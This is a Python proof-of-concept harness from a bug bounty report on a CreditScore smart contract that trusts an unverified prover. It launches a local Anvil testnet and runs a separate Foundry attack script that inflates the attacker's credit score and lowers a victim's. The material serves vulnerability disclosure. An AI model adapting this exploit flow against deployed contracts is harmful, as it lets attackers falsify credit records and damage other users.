#!/usr/bin/env python3
"""
PoC: CreditScore.verifyQueryResult accepts untrusted prover → credit score manipulation
Finding: F2 — HIGH
Target:  gluwa/CCNext-smart-contracts / contracts/Loan/CreditScore.sol
Program: SpaceCoin CertIK SkyShield

Attack demonstrated:
  1. Attacker inflates own score: 0 → 300 (init) → 310 (+10 fake repayments)
  2. Attacker tanks victim score: 0 → 300 (forced init) → 310 (+10 fake repayments) → 300 (-10 via expired)

Usage:
    cd ~/CCNext-smart-contracts
    python3 ../bug-bounty-reports/SpaceCoin-CertIK/poc_credit_score_manipulation.py
"""

import subprocess
import sys
import time
import os
import signal

REPO_DIR     = os.path.expanduser("~/CCNext-smart-contracts")
SCRIPT_PATH  = "script/PocCreditScoreManipulation.s.sol"
ANVIL_PORT   = 8546          # use 8546 to avoid clashing with any running anvil on 8545
ANVIL_HOST   = f"http://127.0.0.1:{ANVIL_PORT}"
ATTACKER_KEY = "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80"  # anvil[0]

SEP = "=" * 70


def start_anvil():
    print("[*] Starting local Anvil testnet ...")
    proc = subprocess.Popen(
        ["anvil", "--port", str(ANVIL_PORT), "--silent"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    time.sleep(1.5)
    if proc.poll() is not None:
        print("[!] Anvil failed to start — is it installed? (brew install foundry)")
        sys.exit(1)
    print(f"[*] Anvil running on {ANVIL_HOST} (PID {proc.pid})")
    return proc


def run_forge_script():
    print(f"[*] Running forge script: {SCRIPT_PATH}")
    print()
    result = subprocess.run(
        [
            "forge", "script", SCRIPT_PATH,
            "--tc", "PocCreditScoreManipulation",
            "--rpc-url", ANVIL_HOST,
            "--broadcast",
            "--private-key", ATTACKER_KEY,
        ],
        capture_output=True,
        text=True,
        cwd=REPO_DIR,
    )
    return result


def parse_and_display(result):
    combined = result.stdout + result.stderr

    # Extract only the console.log lines from forge output
    log_lines = []
    for line in combined.splitlines():
        stripped = line.strip()
        if any(stripped.startswith(p) for p in ("[deploy]", "[pre]", "[mid]", "[call]", "[post]", "---", "===")):
            log_lines.append(stripped)
        # also capture plain "Root cause" / "Fix:" lines
        elif stripped.startswith("Root cause") or stripped.startswith("Fix:") or stripped.startswith("No check"):
            log_lines.append(stripped)

    if not log_lines:
        # Fallback: show raw output so user can debug
        print("[!] Could not parse forge output — printing raw stdout:")
        print(result.stdout[-4000:] if len(result.stdout) > 4000 else result.stdout)
        if result.returncode != 0:
            print("[!] STDERR:")
            print(result.stderr[-2000:] if len(result.stderr) > 2000 else result.stderr)
        return result.returncode == 0

    print(SEP)
    print("  SpaceCoin — F2: CreditScore.verifyQueryResult Untrusted Prover PoC")
    print(SEP)
    print()
    for line in log_lines:
        print(" ", line)
    print()

    # Check for success markers
    if "ATTACK CONFIRMED" in combined:
        print(SEP)
        print("  RESULT: VULNERABILITY CONFIRMED")
        print("  Both attacks executed without any legitimate loan activity.")
        print(SEP)
        return True
    else:
        print("[!] Expected '=== ATTACK CONFIRMED ===' not found in output.")
        if result.returncode != 0:
            print("[!] forge exited with code", result.returncode)
            print(result.stderr[-1000:])
        return False


def main():
    print()
    print(SEP)
    print("  SpaceCoin F2 — CreditScore Credit Score Manipulation PoC")
    print("  CWE-284: Improper Access Control (missing principal validation)")
    print(SEP)
    print()

    anvil = start_anvil()
    try:
        result = run_forge_script()
        ok = parse_and_display(result)
        sys.exit(0 if ok else 1)
    finally:
        print()
        print("[*] Shutting down Anvil ...")
        anvil.send_signal(signal.SIGTERM)
        anvil.wait()
        print("[*] Done.")


if __name__ == "__main__":
    main()
